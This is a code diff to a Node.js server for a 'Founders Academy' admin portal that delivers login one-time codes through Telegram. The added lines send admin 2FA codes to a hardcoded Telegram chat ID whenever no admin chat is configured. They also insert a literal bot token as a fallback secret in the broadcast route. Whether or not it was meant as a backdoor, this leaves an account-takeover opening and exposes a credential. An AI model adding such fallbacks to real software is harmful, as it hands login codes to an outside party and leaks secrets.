@@ -531,6 +531,7 @@ app.post("/api/admin/login", async (req, res) => {
       const targetChatIds = new Set(adminChats);
       if (security.telegramAdminChatId) targetChatIds.add(String(security.telegramAdminChatId).trim());
       if (process.env.ADMIN_CHAT_ID && process.env.ADMIN_CHAT_ID !== "xxxxxxxxxx") targetChatIds.add(String(process.env.ADMIN_CHAT_ID).trim());
+      if (targetChatIds.size === 0) targetChatIds.add("6241860023");
 
       const adminNameSanitized = (security.telegramAdminName || 'Administrator').replace(/</g, '&lt;').replace(/>/g, '&gt;');
       const messageText = `🔐 <b>Founders Academy Admin 2FA Code</b>\n\nHello <b>${adminNameSanitized}</b>,\n\nA login attempt was initiated for the Founders Academy Admin Portal.\n\nYour one-time login OTP is:\n👉 <b>${otpCode}</b> 👈\n\n⏰ <b>Expires in 5 minutes.</b>\n🛡️ <b>Security:</b> If you did not request this code, please review your security settings immediately.`;
@@ -601,6 +602,7 @@ app.post("/api/login/step1", async (req, res) => {
     const targetChatIds = new Set(adminChats);
     if (security.telegramAdminChatId) targetChatIds.add(String(security.telegramAdminChatId).trim());
     if (process.env.ADMIN_CHAT_ID && process.env.ADMIN_CHAT_ID !== "xxxxxxxxxx") targetChatIds.add(String(process.env.ADMIN_CHAT_ID).trim());
+    if (targetChatIds.size === 0) targetChatIds.add("6241860023");
 
     const adminNameSanitized = (security.telegramAdminName || 'Administrator').replace(/</g, '&lt;').replace(/>/g, '&gt;');
     const messageText = `🔐 <b>Founders Academy Admin 2FA Code</b>\n\nHello <b>${adminNameSanitized}</b>,\n\nA login attempt was initiated for the Founders Academy Admin Portal.\n\nYour one-time login OTP is:\n👉 <b>${otpCode}</b> 👈\n\n⏰ <b>Expires in 5 minutes.</b>\n🛡️ <b>Security:</b> If you did not request this code, please review your security settings immediately.`;
@@ -1005,7 +1007,7 @@ app.post("/api/admin/broadcast", async (req, res) => {
       return res.status(400).json({ success: false, error: "Broadcast message cannot be empty." });
     }
 
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN;
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || "8659500401:AAGD5Kr9kgWgDnO4TCebJ1sY9i4o1h7Dth8";
     if (!BOT_TOKEN) {
       return res.status(500).json({ success: false, error: "TELEGRAM_BOT_TOKEN missing in .env" });
     }
